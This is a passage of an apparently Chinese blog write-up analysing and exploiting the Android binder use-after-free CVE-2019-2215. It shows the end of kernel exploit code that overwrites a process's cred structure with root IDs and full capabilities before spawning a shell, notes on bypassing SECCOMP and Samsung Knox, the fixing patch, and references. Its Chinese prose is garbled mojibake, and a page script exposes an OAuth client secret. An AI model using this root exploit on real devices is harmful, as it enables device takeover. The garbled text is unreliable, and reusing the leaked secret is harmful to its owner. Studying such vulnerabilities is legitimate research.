</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>egid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>fsuid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>fsgid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>securebits</span><span class=p>)),</span> <span class=n>SECUREBITS_DEFAULT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_inheritable</span><span class=p>)),</span> <span class=n>CAP_EMPTY_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_permitted</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_effective</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_bset</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_ambient</span><span class=p>)),</span> <span class=n>CAP_EMPTY_SET</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>å‰é¢å·²ç»æ³„éœ²å‡ºäº†task_struct->credçš„åœ°å€ï¼Œè¿™é‡Œå°±åªç”¨å°†äº‹å…ˆå‡†å¤‡å¥½çš„credç»“æ„ä½“å†™å…¥å³å¯</p><p>æœ€åæ‰§è¡Œ<code>system("/bin/sh");</code>ã€<code>execve("/system/bin/sh");</code>å³å¯è·å¾—rootæƒé™ã€‚</p><p><img src=/img/image-20200629174038205.png loading=lazy alt=image-20200629174038205></p><h4 id=disabling-seccomp>Disabling SECCOMP</h4><p>é¢å¤–çš„å¦‚æœæƒ³è¦å°†ææƒç¨‹åºæ†ç»‘åˆ°appä¸Šçš„è¿˜éœ€è¦è¿™ä¸€æ­¥ï¼ŒAndroid8å¼€å§‹ï¼Œæ‰€æœ‰ Android è½¯ä»¶éƒ½ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ä¸ Linux å†…æ ¸è¿›è¡Œé€šä¿¡ï¼ŒSECCOMPè¿‡æ»¤å™¨ä¼šæ£€æµ‹æ‰€æœ‰çš„éæ³•è°ƒç”¨ã€‚SECCOMPè¿‡æ»¤å™¨æ˜¯æ”¾åœ¨zygote è¿›ç¨‹ä¸­ï¼Œè€Œæ‰€æœ‰çš„Androidåº”ç”¨ç¨‹åºéƒ½æ˜¯è¯¥è¿›ç¨‹forkå‡ºæ¥çš„ï¼ŒæŒ‰ç†æ‰€ä»¥ä¼šå½±å“åˆ°æ‰€æœ‰çš„åº”ç”¨ï¼Œä½†æ˜¯Androidå®‰å…¨å›¢é˜Ÿè¿›è¡Œäº†éƒ¨åˆ†ç­›é€‰ï¼Œåªä¼šé˜»æ­¢æŸäº›ç³»ç»Ÿè°ƒç”¨ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>seccomp</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>mode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>seccomp_filter</span> <span class=o>*</span><span class=n>filter</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>æƒ³è¦ç¦ç”¨SECCOMPï¼Œç›´æ¥å°†modeæ”¹ä¸º0æ˜¯å¯¼è‡´å†…æ ¸å´©æºƒï¼Œéœ€è¦æ¸…é™¤TIF_SECCOMP æ ‡å¿—ã€‚<a class=link href=https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/ target=_blank rel=noopener>è¿™ç¯‡æ–‡ç« </a>å®ç°äº†ç»•è¿‡ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸€çœ‹ã€‚</p><p>å¯¹äºä¸‰æ˜Ÿçš„è®¾å¤‡ï¼Œè¿˜éœ€è¦ç»•è¿‡Knox/RKPæ‰è¡Œã€‚å¯¹äºå¦‚ä½•ç»•è¿‡ï¼Œæœ€è¿‘æœ‰äººå…¬å¼€äº†s8ç›¸å…³çš„<a class=link href=https://github.com/chompie1337/s8_2019_2215_poc target=_blank rel=noopener>åˆ©ç”¨ä»£ç </a>ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ã€‚</p><h4 id=patch>patch</h4><p><a class=link href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target=_blank rel=noopener>patch</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>diff</span> <span class=o>--</span><span class=n>git</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=n>a340766b51fe</span><span class=p>.</span><span class=mf>.2</span><span class=n>ef8bd29e188</span> <span class=mi>100644</span>
</span></span><span class=line><span class=cl><span class=o>---</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=o>+++</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=err>@@</span> <span class=o>-</span><span class=mi>4302</span><span class=p>,</span><span class=mi>6</span> <span class=o>+</span><span class=mi>4302</span><span class=p>,</span><span class=mi>18</span> <span class=err>@@</span> <span class=k>static</span> <span class=kt>int</span> <span class=n>binder_thread_release</span><span class=p>(</span><span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span><span class=p>,</span>
</span></span><span class=line><span class=cl> 		<span class=k>if</span> <span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 			<span class=n>spin_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>t</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>+</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>+	 * If this thread used poll, make sure we remove the waitqueue
</span></span></span><span class=line><span class=cl><span class=cm>+	 * from any epoll data structures holding it with POLLFREE.
</span></span></span><span class=line><span class=cl><span class=cm>+	 * waitqueue_active() is safe to use here because we&#39;re holding
</span></span></span><span class=line><span class=cl><span class=cm>+	 * the inner lock.
</span></span></span><span class=line><span class=cl><span class=cm>+	 */</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=k>if</span> <span class=p>((</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>looper</span> <span class=o>&amp;</span> <span class=n>BINDER_LOOPER_STATE_POLL</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	    <span class=n>waitqueue_active</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>+</span>		<span class=n>wake_up_poll</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>,</span> <span class=n>POLLHUP</span> <span class=o>|</span> <span class=n>POLLFREE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>+</span>
</span></span><span class=line><span class=cl> 	<span class=n>binder_inner_proc_unlock</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>proc</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 	<span class=k>if</span> <span class=p>(</span><span class=n>send_reply</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>åœ¨binder_thread freeä¹‹å‰æ¸…ç†æ‰thread->waitå³å¯ã€‚</p><h3 id=æ€»ç»“>æ€»ç»“</h3><p>å»å¹´å‡ºçš„ç»å…¸çš„ææƒæ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å½“åšææƒå…¥é—¨ä¹Ÿè¿˜ä¸é”™ï¼Œå¯ä»¥å­¦ä¹ åˆ°ä¸€ä¸ªå®Œæ•´çš„ææƒæµç¨‹å’Œå‡ ä¸ªå¸¸è§æ–¹æ³•ã€‚</p><p>åç»­çœŸæœºæµ‹è¯•è¿‡ç¨‹ä¸­æ‰‹ä¸Šæ²¡pixel2 åªèƒ½åœ¨pixelçš„3.18ä¸Šæµ‹è¯•ï¼Œå¾—æ³¨æ„å…ˆæµ‹è¯•å†ä½¿ç”¨ç½‘ä¸Šçš„expã€‚ç„¶åå°±æ˜¯é€‚é…çš„è¯ä¸»è¦æ˜¯å¯¹äºä¸€äº›åç§»çš„é€‚é…ï¼Œä»¥åŠä¸æ˜¯æ‰€æœ‰çš„è®¾å¤‡èƒ½éƒ½ç›´æ¥åˆ©ç”¨ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å’Œä¸åŒäº§å•†åˆä¸ä¸€æ ·ã€‚</p><p>ææƒè¿‡ç¨‹ä¸­æœ€ä¸»è¦æ³¨æ„çš„å°±æ˜¯ä¸è®©å†…æ ¸å‘ç”Ÿå¥‡å¥‡æ€ªæ€ªçš„å¥”æºƒï¼Œæ¯æ¬¡é‡åˆ°å¥”æºƒï¼Œå¯èƒ½å°±éœ€è¦æƒ³å…¶ä»–çš„æ–¹æ³•å»ç»•è¿‡ã€‚</p><p>å…³äºè¿™ä¸ªæ¼æ´è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ€è·¯å¯ä»¥å°è¯•ï¼Œæ¯”å¦‚äººé€ é¡µè¡¨é•œåƒæ”»å‡»ä¹‹ç±»çš„æ–¹å¼ã€‚</p><h4 id=å‚è€ƒ>å‚è€ƒ</h4><ul><li><a class=link href=https://www.52pojie.cn/thread-1083552-1-1.html target=_blank rel=noopener>https://www.52pojie.cn/thread-1083552-1-1.html</a></li><li><a class=link href=https://blog.csdn.net/weixin_43901866/article/details/102458212 target=_blank rel=noopener>https://blog.csdn.net/weixin_43901866/article/details/102458212</a></li><li><a class=link href=https://cloudfuzz.github.io/android-kernel-exploitation/ target=_blank rel=noopener>https://cloudfuzz.github.io/android-kernel-exploitation/</a></li><li><a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability target=_blank rel=noopener>https://github.com/sharif-dev/AndroidKernelVulnerability</a></li><li><a class=link href=https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/ target=_blank rel=noopener>https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/</a></li><li><a class=link href=https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/ target=_blank rel=noopener>https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/</a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/cve/>CVE</a>
<a href=/tags/android%E6%8F%90%E6%9D%83/>Androidææƒ</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>ç›¸å…³æ–‡ç« </h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/><div class=article-details><h2 class=article-title>åœ¨Androidçš„ä¸ªäººå­—å…¸ä¸­å‘ç°å’Œåˆ©ç”¨æ¼æ´(CVE-2018-9375)</h2></div></a></article></div></div></aside><link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css><div id=vssue></div><script src=https://unpkg.com/vue@2/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue/dist/vssue..min.js></script>
<script>new Vue({el:"#vssue",render:e=>e("Vssue",{props:{title:"CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•",options:{autoCreateIssue:!0,owner:"kuekiko",repo:"ykiko",clientId:"95aae0b36f5f8169a39b",clientSecret:"b26f68955b1da8bc4fd0e24b27a6a055d15a5267"}}})})</script><footer class=site-footer><section class=copyright>&copy;
2016 -
2022 ykikoqAq</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>